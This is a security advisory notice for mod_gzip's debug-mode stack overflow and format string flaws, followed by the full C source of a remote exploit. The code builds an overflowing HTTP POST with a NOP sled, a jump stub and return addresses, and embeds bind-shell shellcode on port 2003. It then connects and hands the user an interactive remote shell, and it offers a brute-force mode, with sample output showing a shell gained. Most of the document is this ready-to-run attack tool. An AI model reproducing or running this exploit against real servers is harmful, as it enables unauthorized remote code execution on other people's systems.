source: http://www.securityfocus.com/bid/7769/info

Mod_gzip is reported prone to a stack overflow, format string vulnerability and a file corruption issue due to a predictable naming scheme for log files. Exploitation of these issues could result in execution of malicious instructions or corruption of critical or sensitive files. These issues reportedly only occur when the software is run in debug mode.

/*
\       [exploit code] for mod_gzip (with debug_mode) <= 1.2.26.1a
/
\       Created by xCrZx [crazy_einstein@yahoo.com] /05.06.03/
/
\       Tested on RedHat 8.0 (Psyche) (here is target for it), also tested on FreeBSD 4.7 (1.3.19.2a) (here is no target for it :)
/
\
*/

/*
\
/       Single mode:
\
/       [crz@blacksand crz]$ ./85mod_gzip -t 0 -h localhost
\
/       remote exploit for mod_gzip (debug_mode) [Linux/*BSD]
\                       by xCrZx [crazy_einstein@yahoo.com] /05.06.03/
/
\       Using: ret_err = 0x42127480, ret = 0xbfffd8f0
/
\       [!] Connecting to localhost:80
/       [+] Connected!
\       [*] Trying to connect to localhost:2003 port!!! Pray for success!
/       [*] Sleeping at 2 seconds...
\
/       [!] Shell is accessible!
\
/       uid=99(nobody) gid=99(nobody) groups=99(nobody)
\       Linux blacksand 2.4.18-14 #1 Wed Sep 4 13:35:50 EDT 2002 i686 i686 i386 GNU/Linux
/
\       Brute mode:
/
\       [crz@blacksand crz]$ ./85mod_gzip -h localhost -b 0xbfffffff -s 1000
/
\       remote exploit for mod_gzip (debug_mode) [Linux/*BSD]
/                        by xCrZx [crazy_einstein@yahoo.com] /05.06.03/
\
/       Using: ret_err = 0x42127480, ret = 0xbfffffff ,step = 1000
\
/       [~] Brutemode activated!
\       .
/       [!] Shell is accessible!
\
/       uid=99(nobody) gid=99(nobody) groups=99(nobody)
\       Linux blacksand 2.4.18-14 #1 Wed Sep 4 13:35:50 EDT 2002 i686 i686 i386 GNU/Linux
/
\
*/



#include <stdio.h>
#include <netinet/in.h>
#include <netdb.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>


#define STEP 1000

char fmt[] =

"POST /?%s HTTP/1.1\r\n"
"Content-Type: text/html\r\n"
"Host: %s\r\n"
"Content-Length: %d\r\n"
"Accept-Encoding: gzip, deflate\r\n\r\n"
"%s\r\n\r\n";


struct TARGETS {
        char *distr;
        long ret;
        long std_err;
        char *shellcode;
        char *jmp;
} targets[] = {

        /* you can add targets here */

        {"RedHat 8.0 (Psyche)",  // disributive info
         0xbfffd8f0, // return address in stack
         0x42127480, // address of stderr
         //shellcode for Linux x86 -> bind shell on 2003 port//
         "\x31\xc0\x89\xc3\xb0\x02\xcd\x80\x38\xc3\x74\x05\x8d\x43\x01\xcd\x80"
         "\x31\xc0\x89\x45\x10\x40\x89\xc3\x89\x45\x0c\x40\x89\x45\x08\x8d\x4d"
         "\x08\xb0\x66\xcd\x80\x89\x45\x08\x43\x66\x89\x5d\x14\x66\xc7\x45\x16"
         "\x07\xd3\x31\xd2\x89\x55\x18\x8d\x55\x14\x89\x55\x0c\xc6\x45\x10\x10"
         "\xb0\x66\xcd\x80\x40\x89\x45\x0c\x43\x43\xb0\x66\xcd\x80\x43\x89\x45"
         "\x0c\x89\x45\x10\xb0\x66\xcd\x80\x89\xc3\x31\xc9\xb0\x3f\xcd\x80\x41"
         "\x80\xf9\x03\x75\xf6\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62"
         "\x69\x89\xe3\x52\x53\x89\xe1\xb0\x0b\xcd\x80",

        /*

        special jump instruction (to avoid bad characters in url):
        (jump on our shellcode into heap)

        movl $0xa1a51baa,%ebx
        addl $0x66666666,%ebx
        jmp *%ebx

        */

        "\xbb\xaa\x1b\xa5\xa1\x81\xc3\x66\x66\x66\x66\xff\xe3"

        } };


long getip(char *hostname) {
        struct hostent *he;
        long ipaddr;

        if ((ipaddr = inet_addr(hostname)) < 0) {
                if ((he = gethostbyname(hostname)) == NULL) {
                        perror("gethostbyname()");
                        exit(-1);
                }
                memcpy(&ipaddr, he->h_addr, he->h_length);
        }
        return ipaddr;
}

void usage(char *prog) {

        int i=0;

        printf("\nUsage: %s <-h www.victim.com> [-p port] [-t target] [-r manual_retaddr] [-b addr] [-s step_num]\n\nTargets:\n",prog);
        while(targets[i++].distr) printf("\t[%d] -> %s\n",i-1,targets[i-1].distr);
        printf("\n");
        exit(0);

}

int main(int argc, char **argv) {

        int i=0;
        struct sockaddr_in sockstruct;
        struct hostent *HOST;
        char tmp[20000];
        char buf1[5000],buf2[10000];
        int sock;
        fd_set  rset;
        int port=80,shellport=2003;
        int step=STEP;
        char *victim=NULL;
        long ret=0xbfffffff,ret_err;
        int brutemode=0;
        char *shellcode,*jmp;
        int trg=0;

        printf("\nremote exploit for mod_gzip (debug_mode) [Linux/*BSD]\n\t\t by xCrZx [crazy_einstein@yahoo.com] /05.06.03/\n");

        for(i=0;i<argc;i++) {
                if(argv[i][1]=='h') victim=argv[i+1];
                if(argv[i][1]=='p') port=atoi(argv[i+1]);
                if(argv[i][1]=='t') {ret=targets[atoi(argv[i+1])].ret;trg=atoi(argv[i+1]);}
                if(argv[i][1]=='r') sscanf(argv[i+1],"0x%x",&ret);
                if(argv[i][1]=='b') { brutemode=1; ret=strtoul(argv[i+1],0,16);}
                if(argv[i][1]=='s') { step=atoi(argv[i+1]);}
        }

        if(!victim || ret==0) usage(argv[0]);

        ret_err=targets[trg].std_err;
        shellcode=targets[trg].shellcode;
        jmp=targets[trg].jmp;

        printf("\nUsing: ret_err = 0x%x, ret = 0x%x",ret_err,ret);
        if(brutemode) printf(" ,step = %d\n",step);

        printf("\n");

        if(brutemode)printf("[~] Brutemode activated!\n");

        do {

        sock=socket(PF_INET,SOCK_STREAM,0);
        sockstruct.sin_family=PF_INET;
        sockstruct.sin_addr.s_addr=getip(victim);
        sockstruct.sin_port=htons(port);

        if(!brutemode)printf("\n[!] Connecting to %s:%d\n",victim,port);

        if(connect(sock,(struct sockaddr*)&sockstruct,sizeof(sockstruct))>-1) {

                if(!brutemode)printf("[+] Connected!\n",i);

                memset(tmp ,0x00,sizeof tmp );
                memset(buf1,0x00,sizeof buf1);
                memset(buf2,0x00,sizeof buf2);

                memset(buf1,0x90,2016);
                memcpy(buf1+strlen(buf1),jmp,strlen(jmp));
                memset(buf1+strlen(buf1),0x90,2280);
                *(long *)&buf1[strlen(buf1)]=ret_err;
                for(i=0;i<100;i++) *(long *)&buf1[strlen(buf1)]=ret;

                memset(buf2,0x90,1000);
                memcpy(buf2+strlen(buf2),shellcode,strlen(shellcode));

                sprintf(tmp,fmt,buf1,victim,strlen(buf2),buf2);
                write(sock,tmp,strlen(tmp));

        }else { printf("[x] Error: Could not connect to %s:%d!\n",victim,port);exit(0);}

        close(sock);

        ret-= step;

        if(brutemode) {printf(".");fflush(stdout);}


        if(!brutemode) {
                printf("[*] Trying to connect to %s:%d port!!! Pray for success!\n",victim,shellport);
                printf("[*] Sleeping at 2 seconds...\n");
        }

        sleep(2);

        sock=socket(PF_INET,SOCK_STREAM,0);

        bzero(sockstruct.sin_zero,sizeof(sockstruct.sin_zero));
        sockstruct.sin_family=PF_INET;
        sockstruct.sin_addr.s_addr=getip(victim);
        sockstruct.sin_port=htons(shellport);

        if(connect(sock,(struct sockaddr*)&sockstruct,sizeof(sockstruct))>-1) {
                printf("\n[!] Shell is accessible!\n\n");
                write(sock, "id;uname -a\n", 12);
                while (1) {
                        FD_ZERO(&rset);
                        FD_SET(sock,&rset);
                        FD_SET(STDIN_FILENO,&rset);
                        select(sock + 1, &rset, NULL, NULL, NULL);

                        if (FD_ISSET(sock, &rset)) {
                                i = read(sock, tmp, sizeof(tmp) - 1);
                                if (i <= 0) {
                                        printf("[!] Connection closed.\n");
                                        close(sock);
                                        exit(0);
                                }
                        tmp[i] = 0;
                        printf("%s", tmp);
                        }
                        if (FD_ISSET(STDIN_FILENO, &rset)) {
                                i = read(STDIN_FILENO, tmp, sizeof(tmp) - 1);
                                if (i > 0) {
                                        tmp[i]=0;
                                        write(sock, tmp, i);
                                }
                        }
                }
        } else if(!brutemode)printf("[x] Shell is inaccessible..\n\n");

        close(sock);

        } while ( brutemode );


        return 0;
}